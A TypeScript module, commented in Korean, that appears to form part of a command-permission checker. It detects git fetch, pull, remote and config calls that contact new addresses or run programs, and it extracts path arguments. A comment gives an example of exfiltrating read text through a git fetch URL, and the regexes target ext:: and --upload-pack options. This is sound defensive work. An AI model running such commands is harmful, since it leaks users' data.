/**
 * 명령 판정(commandKind)이 경로를 어디로 볼지 (11/27 앱 전체 보안 검토): 경로로 볼 낱말, 새 자리와 주고받는 git.
 */
/** 받기(fetch · pull)에서 값을 따로 받는 긴 옵션: 그 값은 저장소 자리가 아니다. git 은 줄여 쓴 긴 옵션(--dep)도 받는다 */
const FETCH_VALUE_LONG = ['--depth', '--deepen', '--shallow-since', '--shallow-exclude', '--jobs', '--server-option', '--negotiation-tip', '--refmap', '--filter', '--strategy', '--strategy-option']
const FETCH_VALUE_SHORT = /^-[joXs]$/
const takesValue = (a: string) => FETCH_VALUE_SHORT.test(a) || (a.length >= 4 && !a.includes('=') && FETCH_VALUE_LONG.some((o) => o.startsWith(a)))
/** 원격 이름 꼴 (origin · my.fork) */
const REMOTE_NAME = /^[\w-][\w.-]*$/
/** 주소 꼴: url · 다른 프로그램(ext::) · 경로 · user@host: */
const ADDRESS = /:\/\/|::|^[/.~]|^[^/:\s]*@[^/:\s]*:/
/** 다른 프로그램을 돌리는 옵션 (줄여 쓴 것도) */
const RUNS = /^(--upl|--exe)/

/**
 * 정해 둔 원격(origin 같은 이름)이 아닌 새 자리와 주고받거나, git 이 나중에 돌릴 프로그램 · 주소를 바꾸는 git (11/27 보안 검토):
 * `git fetch "https://…/$(읽은 글)"` 처럼 주소에 글을 실어 보낼 수 있어 밖으로 본다.
 * - fetch · pull · ls-remote: 저장소 자리(값을 받는 옵션의 값은 건너뛴 첫 인자)가 이름 꼴이 아니거나, 어느 인자든 주소 꼴이면
 * - remote: add · set-url, 그 밖에 주소 꼴 인자(remote show <주소>)
 * - config 쓰기(이 저장소): 원격 주소 · 훅 폴더 · 돌릴 프로그램을 바꿀 수 있다 (--global 은 이미 밖)
 * (이름으로 받는 것은 사용자가 정해 둔 곳이라 그대로다)
 */
export function gitOutside(sub: string, rest: string[]): boolean {
  const named = rest.filter((a) => !a.startsWith('-'))
  if (sub === 'remote') return /^(add|set-url)$/.test(named[0] ?? '') || named.slice(1).some((a) => ADDRESS.test(a))
  if (sub === 'config') return !rest.some((a) => /^(--get|--get-all|--get-regexp|--list|-l|--show-origin|--show-scope)$/.test(a)) && !/^(get|list)$/.test(named[0] ?? '')
    && (named.length > 1 || rest.some((a) => /^--(unset|add|replace-all|remove-section|rename-section|edit|file)|^-[ef]$/.test(a)))
  if (sub !== 'fetch' && sub !== 'pull' && sub !== 'ls-remote') return false
  if (rest.some((a) => RUNS.test(a) || (sub === 'ls-remote' && /^-u/.test(a)) || ADDRESS.test(a.replace(/^--?[\w-]+=/, '')))) return true
  for (let i = 0; i < rest.length; i++) {
    const a = rest[i]!
    if (a === '--') return i + 1 < rest.length && !REMOTE_NAME.test(rest[i + 1]!)
    if (!a.startsWith('-')) return !REMOTE_NAME.test(a)
    if (takesValue(a)) i++
  }
  return false
}

/** 옵션에 붙여 적은 경로도 본다: --file=/etc/x · -f/etc/x · -o.git/config · of=/etc/x */
export const pathPart = (a: string) => /^--?[A-Za-z][\w-]*=(.+)$/.exec(a)?.[1] ?? /^-[A-Za-z]([/~].+|\..+)$/.exec(a)?.[1] ?? /^[A-Za-z_]\w*=([/~.].*)$/.exec(a)?.[1] ?? a
/** 가운데의 ../ 로 폴더를 벗어나는 것도 본다 (sub/../../밖) */
export const looksLikePath = (a: string) => a.startsWith('/') || a.startsWith('~') || a.startsWith('..') || a.includes('../') || a.endsWith('/..') || /^"?\$\{?(HOME|PWD)\b/.test(a)
/** 경로로 볼 낱말: 경로 모양이거나, slashes(서버가 링크 · git 내부를 실제 파일로 판정할 때)면 / 가 든 낱말도 (주소는 빼고, 11/27) */
export const pathWord = (v: string, slashes?: boolean) => looksLikePath(v) || (!!slashes && v.includes('/') && !v.startsWith('-') && !/^[a-z][\w+.-]*:\/\//i.test(v))
/** 이름 무늬를 받는 옵션: 그 값은 열 파일이 아니라 거르는 무늬다 (find -not -path './.git/*' · --exclude=.git/*) */
const PATTERN_OPT = /^-(path|ipath|wholename|iwholename|regex|iregex|name|iname|lname|ilname)$/
/** 명령 인자 가운데 경로로 볼 것 (옵션에 붙인 값 포함). 무늬 값은 slashes 로 넓히지 않는다: 전처럼 경로 모양일 때만 */
export function pathWords(args: string[], slashes?: boolean): string[] {
  return args.flatMap((a, i) => {
    const v = pathPart(a)
    const pattern = PATTERN_OPT.test(args[i - 1] ?? '') || /^--?(exclude|include|ignore)/.test(a)
    return pathWord(v, slashes && !pattern) ? [v] : []
  })
}
